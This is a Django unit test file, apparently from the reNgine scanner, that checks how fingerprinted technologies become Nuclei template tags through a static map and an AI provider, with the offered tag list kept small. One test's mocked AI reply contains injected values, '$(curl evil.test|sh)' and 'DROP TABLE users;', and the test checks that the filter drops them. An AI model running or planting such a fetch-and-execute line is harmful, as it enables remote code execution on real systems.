from unittest import mock

from django.test import TestCase
from django.utils import timezone

from cveFeed import nuclei_templates as nt
from dashboard.models import Org, Project
from scanEngine.models import EngineType
from startScan.models import ScanHistory, Subdomain, Technology
from targetApp.models import Domain


class StaticTagsTests(TestCase):
	def test_known_technology_names_map_to_tags(self):
		self.assertEqual(nt.static_tags_for(['WordPress', 'nginx']), {'wordpress', 'cms', 'nginx'})
		self.assertEqual(nt.static_tags_for(['Unknown Thing']), set())
		self.assertEqual(nt.static_tags_for([]), set())
		self.assertEqual(nt.static_tags_for([None, '']), set())


class AiTagsTests(TestCase):
	def test_ai_output_is_restricted_to_the_allowed_tag_list_even_if_it_hallucinates(self):
		provider = mock.Mock()
		provider.complete.return_value = '["jenkins", "DROP TABLE users;", "cms", "$(curl evil.test|sh)"]'
		tags = nt.ai_tags_for(['Some Unmapped Build System'], provider)
		self.assertEqual(tags, {'jenkins', 'cms'})  # only values from CANDIDATE_TAGS survive

	def test_ai_is_not_asked_about_names_the_static_table_already_covers(self):
		provider = mock.Mock()
		provider.complete.return_value = '["jenkins"]'
		nt.ai_tags_for(['nginx'], provider)  # nginx is already in STATIC_TAG_MAP
		provider.complete.assert_not_called()

	def test_no_provider_or_nothing_unmapped_returns_empty_without_calling_anything(self):
		self.assertEqual(nt.ai_tags_for(['Jenkins'], None), set())
		provider = mock.Mock()
		self.assertEqual(nt.ai_tags_for(['nginx'], provider), set())
		provider.complete.assert_not_called()

	def test_ai_errors_and_unparseable_replies_degrade_to_empty_not_a_crash(self):
		provider = mock.Mock()
		provider.complete.side_effect = RuntimeError('boom')
		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider), set())
		provider2 = mock.Mock()
		provider2.complete.return_value = 'not json at all'
		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider2), set())


class PertinentTagsTests(TestCase):
	"""Issue 208: the targeting prompt listed every installed tag (about 41,000 tokens), so a local model could not read it."""

	INSTALLED = {'nginx', 'php', 'wordpress', 'wp-plugin', 'wp-theme', 'apache', 'tomcat', 'apache-tomcat', 'jenkins', 'cms', 'tech', 'cve',
	             'exposure', 'iis', 'oracle', 'cisco', 'kubernetes'} | {f'cve{2000 + n % 25}-{n}' for n in range(5000)}

	def offered(self, *signatures, limit=nt.OFFER_MAX):
		return nt.pertinent_tags(list(signatures), self.INSTALLED, limit)

	def test_the_offer_is_the_tags_that_name_what_the_host_runs_and_the_generic_ones(self):
		out = self.offered(('nginx 1.18.0', 'wordpress'))
		for tag in ('nginx', 'wordpress', 'cms', 'exposure', 'cve'):
			self.assertIn(tag, out)
		self.assertNotIn('jenkins', out)
		self.assertNotIn('cisco', out)
		self.assertLess(len(out), 60)

	def test_a_tag_with_a_part_that_names_the_software_is_offered(self):
		out = self.offered(('Apache Tomcat 9.0',))
		self.assertIn('apache-tomcat', out)
		self.assertIn('tomcat', out)

	def test_a_version_number_is_not_a_word_to_match(self):
		self.assertNotIn('cve2000-0', self.offered(('nginx 2000',)))

	def test_the_offer_is_capped(self):
		many = {f'nginx-plugin-{n}' for n in range(2000)} | {'nginx'}
		out = nt.pertinent_tags([('nginx',)], many, 50)
		self.assertLessEqual(len(out), 50)
		self.assertIn('nginx', out)  # the exact name comes before the longer tags

	def test_the_prompt_lists_the_offer_and_the_answer_is_checked_against_every_installed_tag(self):
		seen = {}
		provider = mock.Mock()
		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{"0": {"tags": ["php", "nginx", "made-up"], "severities": ["high"]}}'
		offered = self.offered(('nginx 1.18.0',))
		self.assertNotIn('php', offered)
		out = nt.ai_plan([('nginx 1.18.0',)], provider, self.INSTALLED, offered=offered)
		self.assertNotIn('"php"', seen['system'])
		self.assertLess(len(seen['system']), 2500)  # not the 5,000 CVE tags
		self.assertEqual(out[0], ({'php', 'nginx'}, ('high',)))  # php was not offered but is installed: accepted; made-up is dropped

	def test_without_an_offer_the_whole_installed_list_is_listed_as_before(self):
		seen = {}
		provider = mock.Mock()
		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{}'
		nt.ai_plan([('nginx',)], provider, {'nginx', 'php'})
		self.assertIn('["nginx", "php"]', seen['system'])

	def test_planning_asks_with_the_offer(self):
		seen = {}
		provider = mock.Mock()
		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{}'
		profile = {'technologies': ['nginx'], 'services': [], 'exposure': [], 'cves': [], 'light': False}
		with mock.patch.object(nt, 'allowed_tags', return_value=set(self.INSTALLED)), mock.patch.object(nt, 'profile_names', return_value=['nginx 1.18.0']):
			nt.plan_targeting({'h.test': profile}, provider)
		self.assertLess(len(seen['system']), 2500)


class SelectTagsTests(TestCase):
	def setUp(self):
		org = Org.objects.create(name='T', slug='t-nuclei-tpl')
		self.project = Project.objects.create(name='P', slug='p-nuclei-tpl', insert_date=timezone.now(), org=org)
		self.domain = Domain.objects.create(name='example.test', project=self.project, insert_date=timezone.now())
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		self.scan = ScanHistory.objects.create(domain=self.domain, scan_type=engine, start_scan_date=timezone.now())

	def test_no_subdomains_or_no_technology_gives_no_tags(self):
		self.assertEqual(nt.select_tags(self.scan), set())
		Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		self.assertEqual(nt.select_tags(self.scan), set())

	def test_fingerprinted_technology_maps_to_static_tags_with_ai_disabled(self):
		sub = Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		sub.technologies.add(Technology.objects.create(name='nginx'))
		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=None):
			self.assertEqual(nt.select_tags(self.scan), {'nginx'})

	def test_ai_augments_static_tags_when_configured(self):
		sub = Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
		sub.technologies.add(Technology.objects.create(name='nginx'), Technology.objects.create(name='Grafana Labs Custom Build'))
		provider = mock.Mock()
		provider.complete.return_value = '["grafana"]'
		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=provider):
			self.assertEqual(nt.select_tags(self.scan), {'nginx', 'grafana'})
